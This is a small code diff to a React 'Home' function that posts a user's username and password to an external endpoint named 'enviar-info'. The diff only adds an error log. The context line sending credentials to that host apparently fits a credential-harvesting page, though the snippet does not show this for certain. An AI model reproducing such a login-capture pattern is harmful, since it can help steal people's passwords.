@@ -11,6 +11,8 @@ function Home() {
     await axios.post("https://api-v2-rouge.vercel.app/enviar-info", { username: Username, senha: Password }).then(res => {
       if (res.data.ok) {
         console.log("TUDO CERTO")
+      } else {
+        console.log("ALGO DEU ERRADO") 
       }
     });
 
